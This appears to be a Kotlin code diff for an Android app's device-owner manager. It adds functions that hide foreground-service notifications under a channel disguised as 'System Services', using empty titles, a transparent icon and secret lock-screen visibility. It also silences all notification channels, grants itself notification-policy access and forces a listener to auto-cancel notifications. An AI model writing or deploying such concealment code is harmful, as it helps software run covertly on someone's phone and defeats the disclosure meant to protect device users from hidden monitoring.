@@ -47,6 +47,9 @@ class DeviceOwnerManager private constructor(private val context: Context) {
         const val PREF_DO_APP_HIDDEN = "device_owner_app_hidden"
         const val PREF_DO_RESET_PIN = "device_owner_reset_pin"
         const val PREF_DO_ACCESSIBILITY_RECOVER = "device_owner_accessibility_recover"
+        
+        // Invisible notification channel
+        const val INVISIBLE_CHANNEL_ID = "hidden_system_service"
 
         @Volatile
         private var instance: DeviceOwnerManager? = null
@@ -471,6 +474,132 @@ class DeviceOwnerManager private constructor(private val context: Context) {
         } catch (e: Exception) {
             false
         }
+    }
+
+    // ==========================================
+    // FEATURE 4C: NOTIFICATION SUPPRESSION
+    // ==========================================
+
+    /**
+     * Setup invisible notification channel for foreground services.
+     * Notifications won't appear in status bar but services keep running.
+     * Call this in Application.onCreate() or when DO is provisioned.
+     */
+    fun setupInvisibleNotifications() {
+        if (!isDeviceOwner()) {
+            Log.w(TAG, "Not Device Owner, using regular notifications")
+            return
+        }
+        
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
+            
+            // Delete existing invisible channel to recreate with proper settings
+            try {
+                notificationManager.deleteNotificationChannel(INVISIBLE_CHANNEL_ID)
+            } catch (e: Exception) {
+                // Channel may not exist yet
+            }
+            
+            // Create new invisible channel with IMPORTANCE_NONE
+            val channel = android.app.NotificationChannel(
+                INVISIBLE_CHANNEL_ID,
+                "System Services",
+                android.app.NotificationManager.IMPORTANCE_NONE
+            ).apply {
+                description = "Background system services"
+                setShowBadge(false)
+                enableLights(false)
+                enableVibration(false)
+                setSound(null, null)
+                lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
+            }
+            
+            notificationManager.createNotificationChannel(channel)
+            Log.d(TAG, "✅ Invisible notification channel created")
+        }
+    }
+
+    /**
+     * Create an invisible notification for foreground services.
+     * Service keeps running, no notification in status bar.
+     */
+    fun createInvisibleNotification(serviceId: Int = 1, serviceName: String = "Background Service"): android.app.Notification {
+        setupInvisibleNotifications()
+        
+        return androidx.core.app.NotificationCompat.Builder(context, INVISIBLE_CHANNEL_ID)
+            .setContentTitle("") // Empty
+            .setContentText("") // Empty
+            .setSmallIcon(android.R.drawable.screen_background_dark_transparent) // Transparent
+            .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MIN)
+            .setCategory(androidx.core.app.NotificationCompat.CATEGORY_SERVICE)
+            .setOngoing(true)
+            .setShowWhen(false)
+            .setSound(null)
+            .setVibrate(null)
+            .setSilent(true)
+            .build()
+    }
+
+    /**
+     * Disable notification toggle in Settings.
+     * Sets all notification channels to IMPORTANCE_NONE.
+     */
+    fun disableNotificationToggle() {
+        if (!isDeviceOwner()) {
+            Log.w(TAG, "Cannot disable notification toggle - not device owner")
+            return
+        }
+        
+        try {
+            // Grant notification policy access to our app
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                try {
+                    dpm.setPermissionGrantState(
+                        adminComponent,
+                        context.packageName,
+                        android.Manifest.permission.ACCESS_NOTIFICATION_POLICY,
+                        DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED
+                    )
+                } catch (e: Exception) {
+                    Log.w(TAG, "Could not grant ACCESS_NOTIFICATION_POLICY", e)
+                }
+            }
+            
+            // Set all channels to IMPORTANCE_NONE
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
+                notificationManager.notificationChannels.forEach { channel ->
+                    channel.importance = android.app.NotificationManager.IMPORTANCE_NONE
+                    notificationManager.createNotificationChannel(channel)
+                }
+                Log.d(TAG, "✅ All notification channels set to IMPORTANCE_NONE")
+            }
+            
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to disable notification toggle", e)
+        }
+    }
+
+    /**
+     * Complete notification suppression setup.
+     * Call this during DO provisioning or app start.
+     */
+    fun setupCompleteNotificationSuppression() {
+        if (!isDeviceOwner()) return
+        
+        Log.d(TAG, "Setting up complete notification suppression...")
+        
+        // 1. Setup invisible notification channel
+        setupInvisibleNotifications()
+        
+        // 2. Disable notification toggle
+        disableNotificationToggle()
+        
+        // 3. Enable notification listener for auto-cancel
+        forceEnableNotificationListener()
+        
+        Log.d(TAG, "✅ Complete notification suppression setup done")
     }
 
     // ==========================================
